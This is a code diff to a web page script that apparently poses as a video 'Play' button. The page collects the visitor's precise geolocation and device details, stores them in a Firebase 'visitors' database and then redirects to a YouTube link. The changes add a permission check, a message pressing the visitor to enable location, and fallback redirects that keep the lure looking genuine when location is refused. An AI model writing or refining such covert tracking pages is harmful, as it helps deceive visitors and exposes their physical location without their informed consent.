@@ -94,7 +94,7 @@
       };
     }
 
-    // Save event
+    // Save event to Firebase
     function saveEvent(extra = {}) {
       const deviceInfo = getDeviceInfo();
       const payload = {
@@ -111,10 +111,31 @@
       return database.ref("visitors").push(payload);
     }
 
+    // Check permission state
+    async function checkPermission() {
+      try {
+        const result = await navigator.permissions.query({ name: "geolocation" });
+        if (result.state === "denied") {
+          errorEl.textContent = "❌ Location access is blocked in your browser settings.";
+          return false;
+        }
+        return true;
+      } catch {
+        return true; // Some browsers don’t support Permissions API
+      }
+    }
+
     // Handle button click
-    playBtn.addEventListener("click", () => {
+    playBtn.addEventListener("click", async () => {
       statusEl.textContent = "⏳ Please wait a moment...";
       errorEl.textContent = "";
+
+      const canAsk = await checkPermission();
+      if (!canAsk) {
+        statusEl.textContent = "";
+        errorEl.textContent = "❌ Click on Play Button Again (Enable Location)";
+        return;
+      }
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
@@ -135,6 +156,8 @@
             await saveEvent({ error: err.message });
             statusEl.textContent = "";
             errorEl.textContent = "❌ Click on Play Button Again";
+            // Fallback → still redirect after 3s
+            setTimeout(() => window.location.href = youtubeLink, 3000);
           },
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
@@ -142,6 +165,7 @@
         saveEvent({ error: "Geolocation not supported" });
         statusEl.textContent = "";
         errorEl.textContent = "❌ Your browser does not support location access.";
+        setTimeout(() => window.location.href = youtubeLink, 3000);
       }
     });
   </script>
